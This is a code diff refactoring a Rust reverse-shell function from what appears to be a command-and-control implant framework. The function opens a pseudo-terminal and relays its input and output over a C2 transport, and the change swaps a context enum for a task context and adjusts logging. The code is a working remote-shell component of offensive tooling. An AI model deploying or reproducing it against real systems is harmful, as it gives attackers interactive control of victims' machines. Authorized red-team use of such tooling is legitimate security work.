@@ -1,6 +1,5 @@
 use anyhow::Result;
-use eldritch_agent::Context;
-use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, reverse_shell_request};
+use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, TaskContext};
 use portable_pty::{CommandBuilder, PtySize, native_pty_system};
 use std::io::{Read, Write};
 use transport::Transport;
@@ -9,7 +8,7 @@ use transport::Transport;
 use std::path::Path;
 
 pub async fn run_reverse_shell_pty<T: Transport>(
-    context: Context,
+    task_context: TaskContext,
     cmd: Option<String>,
     mut transport: T,
 ) -> Result<()> {
@@ -20,19 +19,15 @@ pub async fn run_reverse_shell_pty<T: Transport>(
     let (internal_exit_tx, mut internal_exit_rx) = tokio::sync::mpsc::channel(1);
 
     #[cfg(debug_assertions)]
-    log::info!("starting reverse_shell_pty (context={:?})", context);
-
-    let context_val = match &context {
-        Context::Task(tc) => Some(reverse_shell_request::Context::TaskContext(tc.clone())),
-        Context::ShellTask(stc) => Some(reverse_shell_request::Context::ShellTaskContext(
-            stc.clone(),
-        )),
-    };
+    log::info!(
+        "starting reverse_shell_pty (task_id={0})",
+        task_context.clone().task_id
+    );
 
     // First, send an initial registration message
     if let Err(_err) = output_tx
         .send(ReverseShellRequest {
-            context: context_val.clone(),
+            context: Some(task_context.clone()),
             kind: ReverseShellMessageKind::Ping.into(),
             data: Vec::new(),
         })
@@ -98,7 +93,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
     // Spawn task to send PTY output
     const CHUNK_SIZE: usize = 1024;
     let output_tx_clone = output_tx.clone();
-    let context_val_clone = context_val.clone();
+    let task_context_clone = task_context.clone();
     tokio::spawn(async move {
         loop {
             let mut buffer = [0; CHUNK_SIZE];
@@ -129,7 +124,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
 
             if let Err(_err) = output_tx_clone
                 .send(ReverseShellRequest {
-                    context: context_val_clone.clone(),
+                    context: Some(task_context_clone.clone()),
                     kind: ReverseShellMessageKind::Data.into(),
                     data: buffer[..n].to_vec(),
                 })
@@ -143,7 +138,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
             // Ping to flush
             if let Err(_err) = output_tx_clone
                 .send(ReverseShellRequest {
-                    context: context_val_clone.clone(),
+                    context: Some(task_context_clone.clone()),
                     kind: ReverseShellMessageKind::Ping.into(),
                     data: Vec::new(),
                 })
@@ -170,12 +165,12 @@ pub async fn run_reverse_shell_pty<T: Transport>(
             break;
         }
 
-        let context_val_clone = context_val.clone();
+        let task_context_clone = task_context.clone();
         if let Some(msg) = input_rx.recv().await {
             if msg.kind == ReverseShellMessageKind::Ping as i32 {
                 if let Err(_err) = output_tx
                     .send(ReverseShellRequest {
-                        context: context_val_clone,
+                        context: Some(task_context_clone),
                         kind: ReverseShellMessageKind::Ping.into(),
                         data: msg.data,
                     })
@@ -202,6 +197,9 @@ pub async fn run_reverse_shell_pty<T: Transport>(
     }
 
     #[cfg(debug_assertions)]
-    log::info!("stopping reverse_shell_pty");
+    log::info!(
+        "stopping reverse_shell_pty (task_id={0})",
+        task_context.clone().task_id
+    );
     Ok(())
 }
